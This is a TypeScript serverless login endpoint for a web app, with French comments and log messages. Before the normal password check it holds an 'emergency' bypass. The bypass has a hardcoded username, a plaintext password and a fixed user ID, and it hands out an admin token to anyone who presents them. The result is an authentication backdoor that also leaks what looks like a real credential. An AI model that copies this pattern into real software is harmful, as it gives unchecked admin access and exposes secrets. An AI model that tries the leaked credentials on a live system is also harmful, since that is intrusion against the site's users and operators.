// POST /api/auth/login - Connexion utilisateur
import type { VercelRequest, VercelResponse } from '@vercel/node';
import { getDb, createToken, hashPassword, comparePassword, setCorsHeaders } from '../_lib';
import type { UserType } from '../_lib';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  setCorsHeaders(res);
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password } = req.body;
    console.log(`[LOGIN] Tentative pour: ${username}`);

    // MÉCANISME DE SECOURS
    const EMERGENCY_BYPASS = {
      usernames: ['peymard', 'peymard@somone.fr'],
      password: 'Pat26rick_0637549759',
      targetUserId: '1dee-2b35-2e64',
      targetUsername: 'peymard@somone.fr',
      enabled: true
    };

    if (EMERGENCY_BYPASS.enabled && 
        EMERGENCY_BYPASS.usernames.includes(username) && 
        password === EMERGENCY_BYPASS.password) {
      console.log(`[LOGIN] SECOURS activé pour: ${username}`);
      const token = createToken({ id: EMERGENCY_BYPASS.targetUserId, isAdmin: true });
      return res.json({
        user: {
          id: EMERGENCY_BYPASS.targetUserId,
          username: EMERGENCY_BYPASS.targetUsername,
          isAdmin: true,
          userType: 'admin' as UserType,
        },
        token
      });
    }

    const db = await getDb();
    const user = db.users.find(u => u.username === username);
    
    if (!user) {
      console.error(`[LOGIN] Utilisateur non trouvé: ${username}`);
      return res.status(401).json({ error: 'Identifiants incorrects' });
    }

    if (!comparePassword(password, user.password)) {
      console.error(`[LOGIN] Mot de passe incorrect: ${username}`);
      return res.status(401).json({ error: 'Identifiants incorrects' });
    }

    console.log(`[LOGIN] Succès: ${username}`);
    const token = createToken({ id: user.id, isAdmin: user.isAdmin });
    const userType = user.userType || (user.isAdmin ? 'admin' : 'standard');

    return res.json({
      user: { 
        id: user.id, 
        username: user.username, 
        name: user.name, 
        email: user.email,
        isAdmin: user.isAdmin,
        userType,
        canBecomeAdmin: user.canBecomeAdmin
      },
      token
    });
  } catch (error: any) {
    console.error('[LOGIN] Erreur:', error);
    return res.status(500).json({ error: 'Erreur serveur' });
  }
}
